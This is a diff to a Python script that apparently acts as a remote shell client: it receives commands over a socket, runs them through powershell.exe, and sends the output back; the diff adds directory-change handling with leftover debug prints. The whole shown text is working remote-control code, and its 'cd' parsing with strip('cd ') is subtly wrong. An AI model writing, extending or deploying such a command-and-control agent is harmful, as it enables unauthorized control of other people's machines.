@@ -12,6 +12,22 @@ while True:
     if command == "STOP":
         s.close()
         break
+    elif command == "":
+        continue
+    elif command.startswith("cd"):
+        print("1")
+        pathtomove = command.strip("cd ")
+        print(pathtomove)
+        if os.path.exists(pathtomove):
+            print("2")
+            os.chdir(pathtomove)
+            print("3")
+            message = os.getcwd()
+            print(message)
+        else:
+            print("not exist")
+            message = "path doesnot exit"
+
     else:
        raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True)
        if raw_message.stderr == "".encode():
@@ -20,5 +36,5 @@ while True:
            message = "error"
 
 
-       message = message + identifier
+    message = message + identifier
     s.sendall(message.encode())
